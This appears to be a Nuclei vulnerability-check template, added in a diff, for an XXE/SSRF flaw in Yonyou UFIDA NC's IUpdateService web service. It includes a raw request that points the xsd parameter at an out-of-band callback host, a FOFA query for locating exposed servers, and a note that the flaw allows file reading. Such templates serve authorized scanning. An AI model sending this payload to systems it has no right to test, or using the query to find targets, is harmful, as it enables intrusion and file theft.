@@ -1,0 +1,32 @@
+id: yonyou-nc-IUpdateService-xsd-xxe
+info:
+  name: 用友 UFIDA NC nc.uap.oba.update.IUpdateServic - xxe
+  author: leadlife
+  severity: high
+  description:
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%20NC%20uapws%20wsdl%20XXE%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+    tips: 利用该漏洞可读取文件 https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8B_NC_uapws_wsdl_XXE%E6%BC%8F%E6%B4%9E
+  tags: yonyou,xxe,nc,oa,oob
+
+
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Accept: text/plain, */*; q=0.01
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body,'<?xml')"
+          - "contains(interactsh_protocol, 'dns')"
+        condition: and
